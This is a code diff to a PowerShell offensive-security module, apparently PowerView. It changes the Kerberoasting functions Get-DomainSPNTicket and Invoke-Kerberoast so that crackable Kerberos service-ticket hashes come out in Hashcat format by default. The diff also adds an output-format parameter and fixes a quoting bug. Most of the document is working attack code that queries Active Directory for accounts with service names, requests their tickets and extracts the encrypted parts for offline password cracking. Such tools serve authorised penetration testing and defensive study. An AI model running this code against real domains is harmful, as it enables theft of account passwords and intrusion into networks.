@@ -2587,7 +2587,7 @@ This function will either take one/more SPN strings, or one/more PowerView.User 
 (the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
 using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
 portion of the ticket is then extracted and output in either crackable John or Hashcat
-format (deafult of John).
+format (deafult of Hashcat).
 
 .PARAMETER SPN
 
@@ -2621,9 +2621,9 @@ Request kerberos service tickets for all SPNs passed on the pipeline.
 
 .EXAMPLE
 
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
+Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR
 
-Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.
+Request kerberos service tickets for all users with non-null SPNs and output in JTR format.
 
 .INPUTS
 
@@ -2661,7 +2661,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
-        $OutputFormat = 'John',
+        $OutputFormat = 'Hashcat',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -2715,6 +2715,10 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
                 $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
 
+                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
+                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
+                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
+
                 # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                 # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                 if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
@@ -2724,7 +2728,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
                     # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                     if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
-                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
+                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                         $Hash = $null
                         $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                     } else {
@@ -2738,6 +2742,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 }
 
                 if($Hash) {
+                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
                     if ($OutputFormat -match 'John') {
                         $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                     }
@@ -2749,17 +2754,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                             $UserDomain = 'UNKNOWN'
                         }
 
-                        # hashcat output format
+                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
                         $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                     }
                     $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 }
 
-                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
-                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
-                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
-                Write-Output $Out
+                $Out
             }
         }
     }
@@ -2786,6 +2788,7 @@ Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-Domain
 
 Uses Get-DomainUser to query for user accounts with non-null service principle
 names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
+The ticket format can be specified with -OutputFormat <John/Hashcat>.
 
 .PARAMETER Identity
 
@@ -2826,6 +2829,11 @@ Specifies the maximum amount of time the server spends searching. Default of 120
 
 Switch. Specifies that the searcher should also return deleted/tombstoned objects.
 
+.PARAMETER OutputFormat
+
+Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
+Defaults to 'Hashcat'.
+
 .PARAMETER Credential
 
 A [Management.Automation.PSCredential] object of alternate credentials
@@ -2835,14 +2843,14 @@ for connection to the target domain.
 
 Invoke-Kerberoast | fl
 
-Kerberoasts all found SPNs for the current domain.
+Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).
 
 .EXAMPLE
 
 Invoke-Kerberoast -Domain dev.testlab.local | fl
 
-Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
-format instead of John (the default).
+Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
+format instead of Hashcat.
 
 .EXAMPLE
 
@@ -2902,6 +2910,11 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [Switch]
         $Tombstone,
 
+        [ValidateSet('John', 'Hashcat')]
+        [Alias('Format')]
+        [String]
+        $OutputFormat = 'Hashcat',
+
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
         $Credential = [Management.Automation.PSCredential]::Empty
@@ -2929,7 +2942,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
     PROCESS {
         if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket
+        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
     }
 
     END {
